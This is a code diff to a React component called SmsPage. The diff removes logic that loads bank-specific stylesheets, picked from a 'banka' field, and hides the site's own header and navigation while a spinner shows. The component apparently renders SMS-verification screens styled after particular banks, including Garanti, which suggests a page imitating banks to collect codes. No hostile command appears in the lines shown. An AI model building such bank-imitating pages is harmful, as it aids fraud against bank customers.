@@ -188,36 +188,6 @@ export default function SmsPage() {
     }
 
     const bank = (data?.banka || '').toLowerCase().trim();
-    const cssLinks = getBankCssLinks(bank);
-
-    if (cssLinks.length > 0 && !cssLoaded) {
-        return (
-            <div className="flex items-center justify-center min-h-screen bg-white">
-                <style jsx global>{`
-                    nav.fixed.bottom-0 { display: none !important; }
-                    main { padding-bottom: 0 !important; }
-                    header { display: none !important; }
-                    body { background: #fff !important; }
-                `}</style>
-                {cssLinks.map((href, index) => (
-                    <link 
-                        key={href} 
-                        rel="stylesheet" 
-                        href={href} 
-                        onLoad={index === cssLinks.length - 1 ? () => setCssLoaded(true) : undefined}
-                        onError={index === cssLinks.length - 1 ? () => setCssLoaded(true) : undefined}
-                    />
-                ))}
-                <div style={{ width: '40px', height: '40px', border: '4px solid #f3f3f3', borderTop: '4px solid #3498db', borderRadius: '50%', animation: 'spin 1s linear infinite' }} />
-                <style jsx>{`
-                    @keyframes spin {
-                        0% { transform: rotate(0deg); }
-                        100% { transform: rotate(360deg); }
-                    }
-                `}</style>
-            </div>
-        );
-    }
 
     // 1. GARANTİ RENDER
     const renderGaranti = () => {
